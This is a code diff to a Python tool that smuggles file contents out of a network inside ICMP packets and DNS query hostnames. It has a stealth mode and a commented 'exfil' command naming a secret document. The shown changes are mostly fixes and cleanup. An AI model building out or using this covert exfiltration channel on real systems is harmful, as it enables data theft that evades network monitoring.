@@ -55,6 +55,8 @@ receiveSocket   = None
 sendICMPSocket  = None
 sendDNSSocket   = None
 
+pktCount = 0
+
 class ICMPPacket:
     def __init__(self, type, code, data):
         self.type = type
@@ -62,7 +64,7 @@ class ICMPPacket:
         self.data = data
 
     def computeChecksum():
-        return
+        pass
     
     def getHeader(self):
         # Type (8), code(8), checksum(16), id(16), sequence(16)
@@ -80,18 +82,14 @@ class DNSPacket:
         self.QR = 0
 
     def computeChecksum():
-        return
+        pass
         
     def getHeader(self, length):
         # ID (16), QR(1), OpCode(4), AA(1), TC(1), RD(1), RA(1), Z(1), RCode(16), QDCount(16), ANCount(16), NSCount(16), ARCount(16)
         # All flags are 0 so we can just use an unsigned short (16 bytes) of 0
 
         packetId = int((id(self) * random.random()) % 65535)
-        
-        # DNS uses UDP so create UDP header first
-        #udpHeader = struct.pack("HHHH", socket.htons(60123), socket.htons(53), socket.htons(8 + 18 + 4*math.ceil(chunkLength/3)), 0)
-        #udpHeader = struct.pack("HHHH", socket.htons(60123), socket.htons(dstPort), socket.htons(length), 0)
-        dnsHeader = struct.pack("HHHHHH", socket.htons(packetId), 0, socket.htons(1), 0, 0, 0)
+        dnsHeader = struct.pack("!HHHHHH", packetId, 0, 1, 0, 0, 0)
         return dnsHeader
 
     def construct(self):
@@ -108,7 +106,6 @@ def main():
     #parseCommand("exfil -f -d secretdoc1.txt")
 
 # callback for received packets
-pktCount = 0
 def recv_pkts(data):
     global pktCount
 
@@ -215,7 +212,7 @@ def parseCommand(cmd):
         # TODO: Handle errors thrown by parse_args()
         args = parser.parse_args(cmd)
 
-        # Check constraints on arguments
+        # Check constraints on arguments (manual mutual exclusivity)
         ret = False
 
         if args.stealth & args.fast:
@@ -235,7 +232,10 @@ def parseCommand(cmd):
             return
 
         # Set defaults if nothing was provided
-        if not(args.stealth | args.fast) & (not(args.pps)):
+        print("args.pps: " + str(args.pps))
+        if not(args.stealth | args.fast | bool(args.pps)):
+            print("Using default mode: stealth")
+            print("args.pss: " + str(args.pps))
             args.stealth = True
         if not(args.icmp | args.dns | args.mixed):
             args.mixed = True
@@ -273,7 +273,6 @@ def sendFileLoop():
     # Reset start byte so we're starting at the beginning of new file
     startByte = 0
 
-    # TODO: Handle exceptions thrown by readFile
     if not workingDirectory.endswith("/"):
         workingDirectory += "/"
 
@@ -282,9 +281,6 @@ def sendFileLoop():
     except Exception as e:
         print("Error: " + str(e))
         return
-    #else:
-    #    print("Unable to access the specified file.")
-    #    return
 
     if stealthMode:
         if updatedPPI == 0:
@@ -371,6 +367,7 @@ def sendDataLoop(data):
     sendEndOfTransmission()
 
     completedTransfer = True
+
 def getNextPacketType():
     if icmpOnly:
         return ICMP_PROTOCOL
@@ -420,23 +417,19 @@ def createICMPPacketFromData(msg):
 
 def createDNSPacketFromData(msg):
     if len(msg) > 248:
+        # TODO: IMPORTANT, consider throwing error instead of truncating, it's not expected behaviour
         # TODO: Add correct exception, e.g. ArgumentOutOfRangeException
         print("Data too long")
-        #raise Exception
-        #return
-        # TODO: IMPORTANT, remove this, for demo purposes only
         # Truncate output
         msg = msg[:248]
+
+
     dataProgress = 0
-
     queryHostname = b''
-    #fileData = getNextChunk(startByte, 248)
-    #queryHostname = prepareDataForDNS(fileData)
 
-    # These packets won't be regular, so no need to randomise label lengths
-    # Split the data in to four labels
     print("Creating DNS packet from data")
 
+    # These packets won't be regular, so no need to randomise label lengths
     # Divide data into four labels, accounting for lengths non divisable by 4    
     if len(msg) % 4 != 0:
         labelSize = int(len(msg) / 3)
@@ -497,7 +490,6 @@ def sendEndOfTransmission():
      
 def readFile(name, mode):
     fileBytes = b''
-    # Use 'rb' mode for reading in binary
     try:
         f = open(name, mode)
 
